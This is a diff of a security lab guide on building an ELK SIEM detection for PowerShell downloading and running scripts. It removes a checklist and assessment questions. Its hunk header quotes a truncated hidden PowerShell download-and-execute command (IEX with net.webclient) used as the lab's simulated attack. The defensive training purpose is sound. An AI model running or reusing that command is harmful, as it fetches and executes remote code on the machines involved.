@@ -253,24 +253,3 @@ powershell -exec bypass -nop -w hidden "IEX ((new-object net.webclient).download
 
 ![](https://labondemand.blob.core.windows.net/content/lab161185/Screens/e2ooxcfi.jpg)
 
-- [ ]  You can identify any attempt made to connect to internet using Trusted binaries connecting (PowerShell).
-- [ ]  Close all open windows.
-
-> Do not cancel the lab session. You will need the configurations done in this exercise for the upcomming exercises of this module. In case, if you cancel the lab session, you need to perform this lab steps again.
-> 
-
-**End of the Exercise**
-
-In this exercise you have learnt how to create ELK SIEM use case for monitoring Powershell Command connecting to the internet for downloading and executing scripts.
-
-**Assessment 4.6.1**
-
-What is the default port used by Kibana?
-
-**Assessment 4.6.2**
-
-You have successfully created an ELK use case for monitoring trusted binaries connected to the Internet. You have set up Kibana and created an index pattern with the name winlogbeat*. Assume that someone has launched a web client and downloaded a malicious script from the Windows Server 2012 virtual machine’s PowerShell. Kibana’s Discover page immediately captured a stream of logs associated with Windows Server 2012’s PowerShell. Upon expanding an event, Kibana displayed a stream of data associated with the event. What is the ProcessID displayed in the data?
-
-**Assessment 4.6.3**
-
-What is the default port used by Logstash?
